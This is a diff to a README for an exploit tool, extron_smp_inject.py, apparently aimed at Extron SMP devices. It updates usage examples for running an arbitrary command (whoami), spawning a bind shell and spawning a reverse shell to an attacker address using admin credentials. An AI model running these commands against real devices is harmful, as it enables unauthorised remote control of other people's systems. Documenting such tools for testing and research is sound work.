@@ -51,19 +51,19 @@ python extron_smp_inject.py <action> [options]
 **Execute an arbitrary command:**
 
 ```bash
-python extron_smp_inject.py command <target_ip> <target_port> --username admin --password <password> "ls -la"
+python extron_smp_inject.py command --password admin whoami 192.168.1.1 443
 ```
 
 **Spawn a bind shell:**
 
 ```bash
-python extron_smp_inject.py bind <target_ip> <target_port> <local_port> --username admin --password <password>
+python extron_smp_inject.py bind --password admin 4444 192.168.1.1 443
 ```
 
 **Spawn a reverse shell:**
 
 ```bash
-python extron_smp_inject.py reverse <target_ip> <target_port> <attacker_ip> <attacker_port> --username admin --password <password>
+python extron_smp_inject.py reverse --password admin 192.168.0.1 4444 192.168.1.1 443
 ```
 
 ## Logging
